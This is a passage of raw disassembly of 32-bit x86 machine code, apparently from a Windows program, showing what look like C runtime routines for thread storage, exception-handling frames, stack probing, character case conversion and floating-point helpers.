  412eb5:	74 0e                	je     0x412ec5
  412eb7:	50                   	push   %eax
  412eb8:	ff 15 c4 80 41 00    	call   *0x4180c4
  412ebe:	83 0d bc 61 45 00 ff 	orl    $0xffffffff,0x4561bc
  412ec5:	c3                   	ret
  412ec6:	53                   	push   %ebx
  412ec7:	56                   	push   %esi
  412ec8:	ff 15 2c 80 41 00    	call   *0x41802c
  412ece:	ff 35 bc 61 45 00    	push   0x4561bc
  412ed4:	8b d8                	mov    %eax,%ebx
  412ed6:	ff 15 d4 80 41 00    	call   *0x4180d4
  412edc:	8b f0                	mov    %eax,%esi
  412ede:	85 f6                	test   %esi,%esi
  412ee0:	75 49                	jne    0x412f2b
  412ee2:	68 88 00 00 00       	push   $0x88
  412ee7:	6a 01                	push   $0x1
  412ee9:	e8 ca 27 00 00       	call   0x4156b8
  412eee:	8b f0                	mov    %eax,%esi
  412ef0:	85 f6                	test   %esi,%esi
  412ef2:	59                   	pop    %ecx
  412ef3:	59                   	pop    %ecx
  412ef4:	74 2d                	je     0x412f23
  412ef6:	56                   	push   %esi
  412ef7:	ff 35 bc 61 45 00    	push   0x4561bc
  412efd:	ff 15 d0 80 41 00    	call   *0x4180d0
  412f03:	85 c0                	test   %eax,%eax
  412f05:	74 1c                	je     0x412f23
  412f07:	c7 46 54 10 61 45 00 	movl   $0x456110,0x54(%esi)
  412f0e:	c7 46 14 01 00 00 00 	movl   $0x1,0x14(%esi)
  412f15:	ff 15 cc 80 41 00    	call   *0x4180cc
  412f1b:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  412f1f:	89 06                	mov    %eax,(%esi)
  412f21:	eb 08                	jmp    0x412f2b
  412f23:	6a 10                	push   $0x10
  412f25:	e8 f7 eb ff ff       	call   0x411b21
  412f2a:	59                   	pop    %ecx
  412f2b:	53                   	push   %ebx
  412f2c:	ff 15 c8 80 41 00    	call   *0x4180c8
  412f32:	8b c6                	mov    %esi,%eax
  412f34:	5e                   	pop    %esi
  412f35:	5b                   	pop    %ebx
  412f36:	c3                   	ret
  412f37:	e8 b5 0e 00 00       	call   0x413df1
  412f3c:	85 c0                	test   %eax,%eax
  412f3e:	74 10                	je     0x412f50
  412f40:	ff 15 d8 80 41 00    	call   *0x4180d8
  412f46:	83 f8 ff             	cmp    $0xffffffff,%eax
  412f49:	a3 bc 61 45 00       	mov    %eax,0x4561bc
  412f4e:	75 08                	jne    0x412f58
  412f50:	e8 53 ff ff ff       	call   0x412ea8
  412f55:	33 c0                	xor    %eax,%eax
  412f57:	c3                   	ret
  412f58:	56                   	push   %esi
  412f59:	68 88 00 00 00       	push   $0x88
  412f5e:	6a 01                	push   $0x1
  412f60:	e8 53 27 00 00       	call   0x4156b8
  412f65:	8b f0                	mov    %eax,%esi
  412f67:	85 f6                	test   %esi,%esi
  412f69:	59                   	pop    %ecx
  412f6a:	59                   	pop    %ecx
  412f6b:	74 30                	je     0x412f9d
  412f6d:	56                   	push   %esi
  412f6e:	ff 35 bc 61 45 00    	push   0x4561bc
  412f74:	ff 15 d0 80 41 00    	call   *0x4180d0
  412f7a:	85 c0                	test   %eax,%eax
  412f7c:	74 1f                	je     0x412f9d
  412f7e:	c7 46 54 10 61 45 00 	movl   $0x456110,0x54(%esi)
  412f85:	c7 46 14 01 00 00 00 	movl   $0x1,0x14(%esi)
  412f8c:	ff 15 cc 80 41 00    	call   *0x4180cc
  412f92:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  412f96:	89 06                	mov    %eax,(%esi)
  412f98:	33 c0                	xor    %eax,%eax
  412f9a:	40                   	inc    %eax
  412f9b:	5e                   	pop    %esi
  412f9c:	c3                   	ret
  412f9d:	e8 06 ff ff ff       	call   0x412ea8
  412fa2:	33 c0                	xor    %eax,%eax
  412fa4:	5e                   	pop    %esi
  412fa5:	c3                   	ret
  412fa6:	83 3d 8c 6c 45 00 02 	cmpl   $0x2,0x456c8c
  412fad:	75 0d                	jne    0x412fbc
  412faf:	83 3d 98 6c 45 00 05 	cmpl   $0x5,0x456c98
  412fb6:	72 04                	jb     0x412fbc
  412fb8:	33 c0                	xor    %eax,%eax
  412fba:	40                   	inc    %eax
  412fbb:	c3                   	ret
  412fbc:	6a 03                	push   $0x3
  412fbe:	58                   	pop    %eax
  412fbf:	c3                   	ret
  412fc0:	33 c0                	xor    %eax,%eax
  412fc2:	39 44 24 04          	cmp    %eax,0x4(%esp)
  412fc6:	6a 00                	push   $0x0
  412fc8:	0f 94 c0             	sete   %al
  412fcb:	68 00 10 00 00       	push   $0x1000
  412fd0:	50                   	push   %eax
  412fd1:	ff 15 e0 80 41 00    	call   *0x4180e0
  412fd7:	85 c0                	test   %eax,%eax
  412fd9:	a3 3c 73 45 00       	mov    %eax,0x45733c
  412fde:	74 2a                	je     0x41300a
  412fe0:	e8 c1 ff ff ff       	call   0x412fa6
  412fe5:	83 f8 03             	cmp    $0x3,%eax
  412fe8:	a3 40 73 45 00       	mov    %eax,0x457340
  412fed:	75 1e                	jne    0x41300d
  412fef:	68 f8 03 00 00       	push   $0x3f8
  412ff4:	e8 5b 0f 00 00       	call   0x413f54
  412ff9:	85 c0                	test   %eax,%eax
  412ffb:	59                   	pop    %ecx
  412ffc:	75 0f                	jne    0x41300d
  412ffe:	ff 35 3c 73 45 00    	push   0x45733c
  413004:	ff 15 dc 80 41 00    	call   *0x4180dc
  41300a:	33 c0                	xor    %eax,%eax
  41300c:	c3                   	ret
  41300d:	33 c0                	xor    %eax,%eax
  41300f:	40                   	inc    %eax
  413010:	c3                   	ret
  413011:	cc                   	int3
  413012:	cc                   	int3
  413013:	cc                   	int3
  413014:	68 44 59 41 00       	push   $0x415944
  413019:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  41301f:	50                   	push   %eax
  413020:	8b 44 24 10          	mov    0x10(%esp),%eax
  413024:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  413028:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  41302c:	2b e0                	sub    %eax,%esp
  41302e:	53                   	push   %ebx
  41302f:	56                   	push   %esi
  413030:	57                   	push   %edi
  413031:	8b 45 f8             	mov    -0x8(%ebp),%eax
  413034:	89 65 e8             	mov    %esp,-0x18(%ebp)
  413037:	50                   	push   %eax
  413038:	8b 45 fc             	mov    -0x4(%ebp),%eax
  41303b:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  413042:	89 45 f8             	mov    %eax,-0x8(%ebp)
  413045:	8d 45 f0             	lea    -0x10(%ebp),%eax
  413048:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  41304e:	c3                   	ret
  41304f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  413052:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  413059:	59                   	pop    %ecx
  41305a:	5f                   	pop    %edi
  41305b:	5e                   	pop    %esi
  41305c:	5b                   	pop    %ebx
  41305d:	c9                   	leave
  41305e:	51                   	push   %ecx
  41305f:	c3                   	ret
  413060:	3d 00 10 00 00       	cmp    $0x1000,%eax
  413065:	73 0e                	jae    0x413075
  413067:	f7 d8                	neg    %eax
  413069:	03 c4                	add    %esp,%eax
  41306b:	83 c0 04             	add    $0x4,%eax
  41306e:	85 00                	test   %eax,(%eax)
  413070:	94                   	xchg   %eax,%esp
  413071:	8b 00                	mov    (%eax),%eax
  413073:	50                   	push   %eax
  413074:	c3                   	ret
  413075:	51                   	push   %ecx
  413076:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  41307a:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  413080:	2d 00 10 00 00       	sub    $0x1000,%eax
  413085:	85 01                	test   %eax,(%ecx)
  413087:	3d 00 10 00 00       	cmp    $0x1000,%eax
  41308c:	73 ec                	jae    0x41307a
  41308e:	2b c8                	sub    %eax,%ecx
  413090:	8b c4                	mov    %esp,%eax
  413092:	85 01                	test   %eax,(%ecx)
  413094:	8b e1                	mov    %ecx,%esp
  413096:	8b 08                	mov    (%eax),%ecx
  413098:	8b 40 04             	mov    0x4(%eax),%eax
  41309b:	50                   	push   %eax
  41309c:	c3                   	ret
  41309d:	e8 24 fe ff ff       	call   0x412ec6
  4130a2:	8b 40 64             	mov    0x64(%eax),%eax
  4130a5:	3b 05 9c 64 45 00    	cmp    0x45649c,%eax
  4130ab:	74 05                	je     0x4130b2
  4130ad:	e8 4d 28 00 00       	call   0x4158ff
  4130b2:	83 78 28 01          	cmpl   $0x1,0x28(%eax)
  4130b6:	7e 10                	jle    0x4130c8
  4130b8:	6a 04                	push   $0x4
  4130ba:	ff 74 24 08          	push   0x8(%esp)
  4130be:	50                   	push   %eax
  4130bf:	e8 58 29 00 00       	call   0x415a1c
  4130c4:	83 c4 0c             	add    $0xc,%esp
  4130c7:	c3                   	ret
  4130c8:	8b 40 48             	mov    0x48(%eax),%eax
  4130cb:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4130cf:	0f b6 04 48          	movzbl (%eax,%ecx,2),%eax
  4130d3:	83 e0 04             	and    $0x4,%eax
  4130d6:	c3                   	ret
  4130d7:	55                   	push   %ebp
  4130d8:	8b ec                	mov    %esp,%ebp
  4130da:	51                   	push   %ecx
  4130db:	53                   	push   %ebx
  4130dc:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4130df:	56                   	push   %esi
  4130e0:	8b 75 08             	mov    0x8(%ebp),%esi
  4130e3:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  4130e7:	57                   	push   %edi
  4130e8:	0f 84 9d 00 00 00    	je     0x41318b
  4130ee:	83 7e 24 00          	cmpl   $0x0,0x24(%esi)
  4130f2:	74 09                	je     0x4130fd
  4130f4:	83 fb 7f             	cmp    $0x7f,%ebx
  4130f7:	0f 86 8e 00 00 00    	jbe    0x41318b
  4130fd:	33 ff                	xor    %edi,%edi
  4130ff:	47                   	inc    %edi
  413100:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  413106:	73 1f                	jae    0x413127
  413108:	39 7e 28             	cmp    %edi,0x28(%esi)
  41310b:	7e 0d                	jle    0x41311a
  41310d:	57                   	push   %edi
  41310e:	53                   	push   %ebx
  41310f:	56                   	push   %esi
  413110:	e8 07 29 00 00       	call   0x415a1c
  413115:	83 c4 0c             	add    $0xc,%esp
  413118:	eb 09                	jmp    0x413123
  41311a:	8b 46 48             	mov    0x48(%esi),%eax
  41311d:	0f b6 04 58          	movzbl (%eax,%ebx,2),%eax
  413121:	23 c7                	and    %edi,%eax
  413123:	85 c0                	test   %eax,%eax
  413125:	74 71                	je     0x413198
  413127:	8b 56 48             	mov    0x48(%esi),%edx
  41312a:	8b c3                	mov    %ebx,%eax
  41312c:	c1 f8 08             	sar    $0x8,%eax
  41312f:	0f b6 c8             	movzbl %al,%ecx
  413132:	f6 44 4a 01 80       	testb  $0x80,0x1(%edx,%ecx,2)
  413137:	74 0f                	je     0x413148
  413139:	80 65 0a 00          	andb   $0x0,0xa(%ebp)
  41313d:	6a 02                	push   $0x2
  41313f:	88 45 08             	mov    %al,0x8(%ebp)
  413142:	88 5d 09             	mov    %bl,0x9(%ebp)
  413145:	58                   	pop    %eax
  413146:	eb 09                	jmp    0x413151
  413148:	80 65 09 00          	andb   $0x0,0x9(%ebp)
  41314c:	88 5d 08             	mov    %bl,0x8(%ebp)
  41314f:	8b c7                	mov    %edi,%eax
  413151:	57                   	push   %edi
  413152:	ff 76 04             	push   0x4(%esi)
  413155:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  413158:	6a 03                	push   $0x3
  41315a:	51                   	push   %ecx
  41315b:	50                   	push   %eax
  41315c:	8d 45 08             	lea    0x8(%ebp),%eax
  41315f:	50                   	push   %eax
  413160:	68 00 01 00 00       	push   $0x100
  413165:	ff 76 14             	push   0x14(%esi)
  413168:	e8 26 29 00 00       	call   0x415a93
  41316d:	83 c4 20             	add    $0x20,%esp
  413170:	85 c0                	test   %eax,%eax
  413172:	74 24                	je     0x413198
  413174:	3b c7                	cmp    %edi,%eax
  413176:	75 06                	jne    0x41317e
  413178:	0f b6 45 fc          	movzbl -0x4(%ebp),%eax
  41317c:	eb 1c                	jmp    0x41319a
  41317e:	0f b6 4d fd          	movzbl -0x3(%ebp),%ecx
  413182:	33 c0                	xor    %eax,%eax
  413184:	8a 65 fc             	mov    -0x4(%ebp),%ah
  413187:	0b c1                	or     %ecx,%eax
  413189:	eb 0f                	jmp    0x41319a
  41318b:	83 fb 41             	cmp    $0x41,%ebx
  41318e:	7c 08                	jl     0x413198
  413190:	83 fb 5a             	cmp    $0x5a,%ebx
  413193:	8d 43 20             	lea    0x20(%ebx),%eax
  413196:	7e 02                	jle    0x41319a
  413198:	8b c3                	mov    %ebx,%eax
  41319a:	5f                   	pop    %edi
  41319b:	5e                   	pop    %esi
  41319c:	5b                   	pop    %ebx
  41319d:	c9                   	leave
  41319e:	c3                   	ret
  41319f:	e8 22 fd ff ff       	call   0x412ec6
  4131a4:	8b 40 64             	mov    0x64(%eax),%eax
  4131a7:	3b 05 9c 64 45 00    	cmp    0x45649c,%eax
  4131ad:	74 05                	je     0x4131b4
  4131af:	e8 4b 27 00 00       	call   0x4158ff
  4131b4:	ff 74 24 04          	push   0x4(%esp)
  4131b8:	50                   	push   %eax
  4131b9:	e8 19 ff ff ff       	call   0x4130d7
  4131be:	59                   	pop    %ecx
  4131bf:	59                   	pop    %ecx
  4131c0:	c3                   	ret
  4131c1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4131c5:	6a 20                	push   $0x20
  4131c7:	59                   	pop    %ecx
  4131c8:	99                   	cltd
  4131c9:	f7 f9                	idiv   %ecx
  4131cb:	6a 1f                	push   $0x1f
  4131cd:	59                   	pop    %ecx
  4131ce:	2b ca                	sub    %edx,%ecx
  4131d0:	83 ca ff             	or     $0xffffffff,%edx
  4131d3:	d3 e2                	shl    %cl,%edx
  4131d5:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4131d9:	f7 d2                	not    %edx
  4131db:	85 14 81             	test   %edx,(%ecx,%eax,4)
  4131de:	74 09                	je     0x4131e9
  4131e0:	33 c0                	xor    %eax,%eax
  4131e2:	c3                   	ret
  4131e3:	83 3c 81 00          	cmpl   $0x0,(%ecx,%eax,4)
  4131e7:	75 f7                	jne    0x4131e0
  4131e9:	40                   	inc    %eax
  4131ea:	83 f8 03             	cmp    $0x3,%eax
  4131ed:	7c f4                	jl     0x4131e3
  4131ef:	33 c0                	xor    %eax,%eax
  4131f1:	40                   	inc    %eax
  4131f2:	c3                   	ret
  4131f3:	8b 44 24 08          	mov    0x8(%esp),%eax
  4131f7:	56                   	push   %esi
  4131f8:	57                   	push   %edi
  4131f9:	6a 20                	push   $0x20
  4131fb:	59                   	pop    %ecx
  4131fc:	99                   	cltd
  4131fd:	f7 f9                	idiv   %ecx
  4131ff:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  413203:	8b f0                	mov    %eax,%esi
  413205:	8d 04 b7             	lea    (%edi,%esi,4),%eax
  413208:	50                   	push   %eax
  413209:	6a 1f                	push   $0x1f
  41320b:	59                   	pop    %ecx
  41320c:	2b ca                	sub    %edx,%ecx
  41320e:	33 d2                	xor    %edx,%edx
  413210:	42                   	inc    %edx
  413211:	d3 e2                	shl    %cl,%edx
  413213:	52                   	push   %edx
  413214:	ff 30                	push   (%eax)
  413216:	e8 34 2c 00 00       	call   0x415e4f
  41321b:	83 c4 0c             	add    $0xc,%esp
  41321e:	4e                   	dec    %esi
  41321f:	78 1c                	js     0x41323d
  413221:	8d 3c b7             	lea    (%edi,%esi,4),%edi
  413224:	85 c0                	test   %eax,%eax
  413226:	74 15                	je     0x41323d
  413228:	57                   	push   %edi
  413229:	6a 01                	push   $0x1
  41322b:	ff 37                	push   (%edi)
  41322d:	e8 1d 2c 00 00       	call   0x415e4f
  413232:	83 c4 0c             	add    $0xc,%esp
  413235:	4e                   	dec    %esi
  413236:	83 ef 04             	sub    $0x4,%edi
  413239:	85 f6                	test   %esi,%esi
  41323b:	7d e7                	jge    0x413224
  41323d:	5f                   	pop    %edi
  41323e:	5e                   	pop    %esi
  41323f:	c3                   	ret
  413240:	55                   	push   %ebp
  413241:	8b ec                	mov    %esp,%ebp
  413243:	51                   	push   %ecx
  413244:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  413248:	53                   	push   %ebx
  413249:	56                   	push   %esi
  41324a:	57                   	push   %edi
  41324b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  41324e:	4f                   	dec    %edi
  41324f:	6a 20                	push   $0x20
  413251:	8d 47 01             	lea    0x1(%edi),%eax
  413254:	59                   	pop    %ecx
  413255:	99                   	cltd
  413256:	f7 f9                	idiv   %ecx
  413258:	6a 1f                	push   $0x1f
  41325a:	5e                   	pop    %esi
  41325b:	2b f2                	sub    %edx,%esi
  41325d:	33 d2                	xor    %edx,%edx
  41325f:	42                   	inc    %edx
  413260:	8b ce                	mov    %esi,%ecx
  413262:	d3 e2                	shl    %cl,%edx
  413264:	8b d8                	mov    %eax,%ebx
  413266:	8b 45 08             	mov    0x8(%ebp),%eax
  413269:	85 14 98             	test   %edx,(%eax,%ebx,4)
  41326c:	74 21                	je     0x41328f
  41326e:	8d 4f 01             	lea    0x1(%edi),%ecx
  413271:	51                   	push   %ecx
  413272:	50                   	push   %eax
  413273:	e8 49 ff ff ff       	call   0x4131c1
  413278:	85 c0                	test   %eax,%eax
  41327a:	59                   	pop    %ecx
  41327b:	59                   	pop    %ecx
  41327c:	75 0e                	jne    0x41328c
  41327e:	57                   	push   %edi
  41327f:	ff 75 08             	push   0x8(%ebp)
  413282:	e8 6c ff ff ff       	call   0x4131f3
  413287:	59                   	pop    %ecx
  413288:	59                   	pop    %ecx
  413289:	89 45 fc             	mov    %eax,-0x4(%ebp)
  41328c:	8b 45 08             	mov    0x8(%ebp),%eax
  41328f:	83 ca ff             	or     $0xffffffff,%edx
  413292:	8b ce                	mov    %esi,%ecx
  413294:	d3 e2                	shl    %cl,%edx
  413296:	6a 03                	push   $0x3
  413298:	59                   	pop    %ecx
  413299:	21 14 98             	and    %edx,(%eax,%ebx,4)
  41329c:	43                   	inc    %ebx
  41329d:	3b d9                	cmp    %ecx,%ebx
  41329f:	7d 09                	jge    0x4132aa
  4132a1:	8d 3c 98             	lea    (%eax,%ebx,4),%edi
  4132a4:	2b cb                	sub    %ebx,%ecx
  4132a6:	33 c0                	xor    %eax,%eax
  4132a8:	f3 ab                	rep stos %eax,%es:(%edi)
  4132aa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4132ad:	5f                   	pop    %edi
  4132ae:	5e                   	pop    %esi
  4132af:	5b                   	pop    %ebx
  4132b0:	c9                   	leave
  4132b1:	c3                   	ret
  4132b2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4132b6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4132ba:	6a 03                	push   $0x3
  4132bc:	5a                   	pop    %edx
  4132bd:	2b c8                	sub    %eax,%ecx
  4132bf:	56                   	push   %esi
  4132c0:	8b 30                	mov    (%eax),%esi
  4132c2:	89 34 01             	mov    %esi,(%ecx,%eax,1)
  4132c5:	83 c0 04             	add    $0x4,%eax
  4132c8:	4a                   	dec    %edx
  4132c9:	75 f5                	jne    0x4132c0
  4132cb:	5e                   	pop    %esi
  4132cc:	c3                   	ret
  4132cd:	33 c0                	xor    %eax,%eax
  4132cf:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4132d3:	83 3c 81 00          	cmpl   $0x0,(%ecx,%eax,4)
  4132d7:	75 0a                	jne    0x4132e3
  4132d9:	40                   	inc    %eax
  4132da:	83 f8 03             	cmp    $0x3,%eax
  4132dd:	7c f0                	jl     0x4132cf
  4132df:	33 c0                	xor    %eax,%eax
  4132e1:	40                   	inc    %eax
  4132e2:	c3                   	ret
  4132e3:	33 c0                	xor    %eax,%eax
  4132e5:	c3                   	ret
  4132e6:	55                   	push   %ebp
  4132e7:	8b ec                	mov    %esp,%ebp
  4132e9:	83 ec 0c             	sub    $0xc,%esp
  4132ec:	8b 45 0c             	mov    0xc(%ebp),%eax
  4132ef:	53                   	push   %ebx
  4132f0:	56                   	push   %esi
  4132f1:	57                   	push   %edi
  4132f2:	6a 20                	push   $0x20
  4132f4:	5e                   	pop    %esi
  4132f5:	99                   	cltd
  4132f6:	8b ce                	mov    %esi,%ecx
  4132f8:	f7 f9                	idiv   %ecx
  4132fa:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4132fd:	83 cf ff             	or     $0xffffffff,%edi
  413300:	89 75 0c             	mov    %esi,0xc(%ebp)
  413303:	8b ca                	mov    %edx,%ecx
  413305:	d3 e7                	shl    %cl,%edi
  413307:	89 45 f8             	mov    %eax,-0x8(%ebp)
  41330a:	33 c0                	xor    %eax,%eax
  41330c:	29 55 0c             	sub    %edx,0xc(%ebp)
  41330f:	f7 d7                	not    %edi
  413311:	89 45 fc             	mov    %eax,-0x4(%ebp)
  413314:	8b 34 83             	mov    (%ebx,%eax,4),%esi
  413317:	8b ce                	mov    %esi,%ecx
  413319:	23 cf                	and    %edi,%ecx
  41331b:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  41331e:	8b ca                	mov    %edx,%ecx
  413320:	d3 ee                	shr    %cl,%esi
  413322:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  413325:	0b 75 fc             	or     -0x4(%ebp),%esi
  413328:	89 34 83             	mov    %esi,(%ebx,%eax,4)
  41332b:	8b 75 f4             	mov    -0xc(%ebp),%esi
  41332e:	d3 e6                	shl    %cl,%esi
  413330:	40                   	inc    %eax
  413331:	83 f8 03             	cmp    $0x3,%eax
  413334:	89 75 fc             	mov    %esi,-0x4(%ebp)
  413337:	7c db                	jl     0x413314
  413339:	6a 02                	push   $0x2
  41333b:	58                   	pop    %eax
  41333c:	8b c8                	mov    %eax,%ecx
  41333e:	2b 4d f8             	sub    -0x8(%ebp),%ecx
  413341:	8d 0c 8b             	lea    (%ebx,%ecx,4),%ecx
  413344:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  413347:	7c 07                	jl     0x413350
  413349:	8b 11                	mov    (%ecx),%edx
  41334b:	89 14 83             	mov    %edx,(%ebx,%eax,4)
  41334e:	eb 04                	jmp    0x413354
  413350:	83 24 83 00          	andl   $0x0,(%ebx,%eax,4)
  413354:	48                   	dec    %eax
  413355:	83 e9 04             	sub    $0x4,%ecx
  413358:	85 c0                	test   %eax,%eax
  41335a:	7d e8                	jge    0x413344
  41335c:	5f                   	pop    %edi
  41335d:	5e                   	pop    %esi
  41335e:	5b                   	pop    %ebx
  41335f:	c9                   	leave
  413360:	c3                   	ret
  413361:	55                   	push   %ebp
  413362:	8b ec                	mov    %esp,%ebp
  413364:	83 ec 18             	sub    $0x18,%esp
  413367:	8b 45 08             	mov    0x8(%ebp),%eax
  41336a:	0f b7 48 0a          	movzwl 0xa(%eax),%ecx
  41336e:	53                   	push   %ebx
  41336f:	56                   	push   %esi
  413370:	8b 75 10             	mov    0x10(%ebp),%esi
  413373:	57                   	push   %edi
  413374:	8b f9                	mov    %ecx,%edi
  413376:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  41337c:	89 4d 08             	mov    %ecx,0x8(%ebp)
  41337f:	8b 48 06             	mov    0x6(%eax),%ecx
  413382:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  413385:	8b 48 02             	mov    0x2(%eax),%ecx
  413388:	0f b7 00             	movzwl (%eax),%eax
  41338b:	c1 e0 10             	shl    $0x10,%eax
  41338e:	81 e7 ff 7f 00 00    	and    $0x7fff,%edi
  413394:	81 ef ff 3f 00 00    	sub    $0x3fff,%edi
  41339a:	81 ff 01 c0 ff ff    	cmp    $0xffffc001,%edi
  4133a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4133a3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4133a6:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4133a9:	50                   	push   %eax
  4133aa:	75 1e                	jne    0x4133ca
  4133ac:	33 db                	xor    %ebx,%ebx
  4133ae:	e8 1a ff ff ff       	call   0x4132cd
  4133b3:	85 c0                	test   %eax,%eax
  4133b5:	59                   	pop    %ecx
  4133b6:	0f 85 bd 00 00 00    	jne    0x413479
  4133bc:	8d 7d f4             	lea    -0xc(%ebp),%edi
  4133bf:	ab                   	stos   %eax,%es:(%edi)
  4133c0:	ab                   	stos   %eax,%es:(%edi)
  4133c1:	ab                   	stos   %eax,%es:(%edi)
  4133c2:	6a 02                	push   $0x2
  4133c4:	58                   	pop    %eax
  4133c5:	e9 b1 00 00 00       	jmp    0x41347b
  4133ca:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4133cd:	50                   	push   %eax
  4133ce:	e8 df fe ff ff       	call   0x4132b2
  4133d3:	ff 76 08             	push   0x8(%esi)
  4133d6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4133d9:	50                   	push   %eax
  4133da:	e8 61 fe ff ff       	call   0x413240
  4133df:	83 c4 10             	add    $0x10,%esp
  4133e2:	85 c0                	test   %eax,%eax
  4133e4:	74 01                	je     0x4133e7
  4133e6:	47                   	inc    %edi
  4133e7:	8b 46 04             	mov    0x4(%esi),%eax
  4133ea:	8b c8                	mov    %eax,%ecx
  4133ec:	2b 4e 08             	sub    0x8(%esi),%ecx
  4133ef:	3b f9                	cmp    %ecx,%edi
  4133f1:	7d 0a                	jge    0x4133fd
  4133f3:	33 c0                	xor    %eax,%eax
  4133f5:	8d 7d f4             	lea    -0xc(%ebp),%edi
  4133f8:	ab                   	stos   %eax,%es:(%edi)
  4133f9:	ab                   	stos   %eax,%es:(%edi)
  4133fa:	ab                   	stos   %eax,%es:(%edi)
  4133fb:	eb 3c                	jmp    0x413439
  4133fd:	3b f8                	cmp    %eax,%edi
  4133ff:	7f 3c                	jg     0x41343d
  413401:	2b c7                	sub    %edi,%eax
  413403:	8b f8                	mov    %eax,%edi
  413405:	8d 45 e8             	lea    -0x18(%ebp),%eax
  413408:	50                   	push   %eax
  413409:	8d 45 f4             	lea    -0xc(%ebp),%eax
  41340c:	50                   	push   %eax
  41340d:	e8 a0 fe ff ff       	call   0x4132b2
  413412:	8d 45 f4             	lea    -0xc(%ebp),%eax
  413415:	57                   	push   %edi
  413416:	50                   	push   %eax
  413417:	e8 ca fe ff ff       	call   0x4132e6
  41341c:	ff 76 08             	push   0x8(%esi)
  41341f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  413422:	50                   	push   %eax
  413423:	e8 18 fe ff ff       	call   0x413240
  413428:	8b 46 0c             	mov    0xc(%esi),%eax
  41342b:	40                   	inc    %eax
  41342c:	50                   	push   %eax
  41342d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  413430:	50                   	push   %eax
  413431:	e8 b0 fe ff ff       	call   0x4132e6
  413436:	83 c4 20             	add    $0x20,%esp
  413439:	33 db                	xor    %ebx,%ebx
  41343b:	eb 85                	jmp    0x4133c2
  41343d:	3b 3e                	cmp    (%esi),%edi
  41343f:	ff 76 0c             	push   0xc(%esi)
  413442:	7c 21                	jl     0x413465
  413444:	33 c0                	xor    %eax,%eax
  413446:	8d 7d f4             	lea    -0xc(%ebp),%edi
  413449:	ab                   	stos   %eax,%es:(%edi)
  41344a:	ab                   	stos   %eax,%es:(%edi)
  41344b:	ab                   	stos   %eax,%es:(%edi)
  41344c:	80 4d f7 80          	orb    $0x80,-0x9(%ebp)
  413450:	8d 45 f4             	lea    -0xc(%ebp),%eax
  413453:	50                   	push   %eax
  413454:	e8 8d fe ff ff       	call   0x4132e6
  413459:	8b 5e 14             	mov    0x14(%esi),%ebx
  41345c:	03 1e                	add    (%esi),%ebx
  41345e:	59                   	pop    %ecx
  41345f:	33 c0                	xor    %eax,%eax
  413461:	59                   	pop    %ecx
  413462:	40                   	inc    %eax
  413463:	eb 16                	jmp    0x41347b
  413465:	8b 5e 14             	mov    0x14(%esi),%ebx
  413468:	80 65 f7 7f          	andb   $0x7f,-0x9(%ebp)
  41346c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  41346f:	50                   	push   %eax
  413470:	03 df                	add    %edi,%ebx
  413472:	e8 6f fe ff ff       	call   0x4132e6
  413477:	59                   	pop    %ecx
  413478:	59                   	pop    %ecx
  413479:	33 c0                	xor    %eax,%eax
  41347b:	6a 1f                	push   $0x1f
  41347d:	59                   	pop    %ecx
  41347e:	2b 4e 0c             	sub    0xc(%esi),%ecx
  413481:	8b 76 10             	mov    0x10(%esi),%esi
  413484:	d3 e3                	shl    %cl,%ebx
  413486:	8b 4d 08             	mov    0x8(%ebp),%ecx
  413489:	f7 d9                	neg    %ecx
  41348b:	1b c9                	sbb    %ecx,%ecx
  41348d:	81 e1 00 00 00 80    	and    $0x80000000,%ecx
  413493:	0b d9                	or     %ecx,%ebx
  413495:	0b 5d f4             	or     -0xc(%ebp),%ebx
  413498:	83 fe 40             	cmp    $0x40,%esi
  41349b:	75 0d                	jne    0x4134aa
  41349d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4134a0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4134a3:	89 59 04             	mov    %ebx,0x4(%ecx)
  4134a6:	89 11                	mov    %edx,(%ecx)
  4134a8:	eb 0a                	jmp    0x4134b4
  4134aa:	83 fe 20             	cmp    $0x20,%esi
  4134ad:	75 05                	jne    0x4134b4
  4134af:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4134b2:	89 19                	mov    %ebx,(%ecx)
  4134b4:	5f                   	pop    %edi
  4134b5:	5e                   	pop    %esi
  4134b6:	5b                   	pop    %ebx
  4134b7:	c9                   	leave
  4134b8:	c3                   	ret
  4134b9:	68 dc 61 45 00       	push   $0x4561dc
